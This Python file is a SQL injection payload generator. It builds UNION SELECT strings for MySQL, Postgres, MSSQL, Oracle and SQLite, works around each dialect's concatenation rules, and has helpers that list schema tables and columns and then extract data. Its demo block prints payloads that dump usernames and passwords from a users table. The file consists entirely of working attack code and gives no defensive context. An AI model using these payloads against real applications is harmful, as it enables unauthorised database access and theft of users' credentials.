"""UNION SELECT payload builder with concatenation."""

import warnings
from dataclasses import dataclass
from typing import Optional

DIALECTS = {
    "mysql":    {"concat": "func", "sep_op": ",",  "comment": "-- -"},
    "postgres": {"concat": "func", "sep_op": ",",  "comment": "-- -"},
    "mssql":    {"concat": "func", "sep_op": ",",  "comment": "-- -"},
    "oracle":   {"concat": "op",   "sep_op": "||", "comment": "-- -"},
    "sqlite":   {"concat": "op",   "sep_op": "||", "comment": "-- -"},
}

CONCAT_LIMITS = {"oracle": 2}


@dataclass
class UnionBuilder:
    cols_total: int
    string_cols: list
    layout: dict
    dialect: str = "mysql"
    sep: str = ":-:"
    table: Optional[str] = "users"
    where: Optional[str] = None
    comment: Optional[str] = None
    force_func: Optional[bool] = None
    null_safe: bool = False
    null_fn: str = "COALESCE"
    quiet: bool = False

    def __post_init__(self):
        if self.dialect.lower() not in DIALECTS:
            raise ValueError(f"unknown dialect: {self.dialect}")
        self.d = dict(DIALECTS[self.dialect.lower()])
        if self.comment is None:
            self.comment = self.d["comment"]

    def _warn(self, message):
        if not self.quiet:
            warnings.warn(message, stacklevel=3)

    def _wrap_null(self, expr):
        if not self.null_safe:
            return expr
        return f"{self.null_fn}({expr},'')"

    def _can_use_concat(self, n_args):
        mx = CONCAT_LIMITS.get(self.dialect.lower())
        if mx is None:
            return True
        return n_args <= mx

    def _concat_expr(self, parts):
        if not parts:
            return "NULL"
        if len(parts) == 1:
            return self._wrap_null(parts[0])

        sep_lit = f"'{self.sep}'"
        interleaved = [self._wrap_null(parts[0])]
        for p in parts[1:]:
            interleaved += [sep_lit, self._wrap_null(p)]

        dialect = self.dialect.lower()
        natural_func = DIALECTS[dialect]["concat"] == "func"

        if self.force_func is True:
            use_func = True
        elif self.force_func is False:
            use_func = False
        else:
            use_func = natural_func

        if use_func and not self._can_use_concat(len(interleaved)):
            self._warn(
                f"{self.dialect}: CONCAT() accepts at most "
                f"{CONCAT_LIMITS[dialect]} arguments, but this expression "
                f"needs {len(interleaved)}. Falling back to the || operator."
            )
            use_func = False

        if not use_func and dialect == "mysql":
            self._warn(
                "MySQL: the || operator is only concatenation when "
                "sql_mode includes PIPES_AS_CONCAT. Otherwise it is a "
                "logical OR. Consider CONCAT() or remove force_func=False."
            )

        if use_func:
            return f"CONCAT({','.join(interleaved)})"
        return "(" + " || ".join(interleaved) + ")"

    def _col_expr(self, idx):
        if idx in self.layout:
            return self._concat_expr(self.layout[idx])
        if idx in self.string_cols:
            return "''"
        return "NULL"

    def build(self, prefix="'"):
        cols = [self._col_expr(i) for i in range(1, self.cols_total + 1)]
        sql = f"{prefix} UNION SELECT " + ",".join(cols)
        if self.table:
            sql += f" FROM {self.table}"
        if self.where:
            sql += f" WHERE {self.where}"
        return sql + self.comment


def tables_payload(cols_total, string_col, dialect="mysql", schema_expr=None, quiet=False):
    if schema_expr is None:
        schema_expr = "database()" if dialect.lower() == "mysql" else "current_schema()"
    return UnionBuilder(cols_total, [string_col], {string_col: ["table_name"]},
                        dialect=dialect, table="information_schema.tables",
                        where=f"table_schema={schema_expr}",
                        quiet=quiet).build()


def columns_payload(cols_total, string_col, target_table, dialect="mysql", quiet=False):
    return UnionBuilder(cols_total, [string_col], {string_col: ["column_name"]},
                        dialect=dialect, table="information_schema.columns",
                        where=f"table_name='{target_table}'",
                        quiet=quiet).build()


def data_payload(cols_total, string_cols, layout, table,
                 sep=":-:", dialect="mysql", quiet=False):
    return UnionBuilder(cols_total, string_cols, layout, dialect=dialect,
                        sep=sep, table=table, quiet=quiet).build()


if __name__ == "__main__":
    print(UnionBuilder(3, [1], {1: ["username", "password"]},
                       dialect="mysql", table="users").build())
    print(UnionBuilder(2, [2], {2: ["username", "password", "role"]},
                       dialect="oracle", table="users").build())